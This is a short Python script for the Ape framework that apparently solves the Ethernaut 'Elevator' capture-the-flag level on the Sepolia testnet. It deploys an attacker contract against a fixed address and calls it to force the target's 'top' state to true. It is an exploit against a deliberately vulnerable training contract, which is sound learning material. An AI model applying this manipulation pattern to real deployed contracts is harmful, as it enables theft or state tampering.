#!/usr/bin/python3
from ape import accounts, convert, project
from rich.console import Console

# sepolia: 0x73d00519B15B74D88369cA5111eaF5c4Ad1c73F9
ADDRESS = "0x73d00519B15B74D88369cA5111eaF5c4Ad1c73F9"

console = Console()


def attack():
    attacker = accounts.load("ctf")
    attacker.set_autosign(True)
    target_contract = project.Elevator.at(ADDRESS)

    console.print(f"[green]Is at Top: [magenta]{target_contract.top()}")
    console.print(f"[green]Current Floor: [magenta]{target_contract.floor()}")
    
    console.print("[red]Attacking Now...")
    

    attacking_contract = project.ElevatorAttack.deploy(ADDRESS, value=convert("0.00001 eth", int), sender=attacker)
    attacking_contract.setTop(500, sender=attacker)

    console.print(f"[green]Is at Top: [magenta]{target_contract.top()}")
    console.print(f"[green]Current Floor: [magenta]{target_contract.floor()}")
    

    assert target_contract.top() is True and target_contract.floor() != 0



def main():
    attack()


if __name__ == "__main__":
    main()
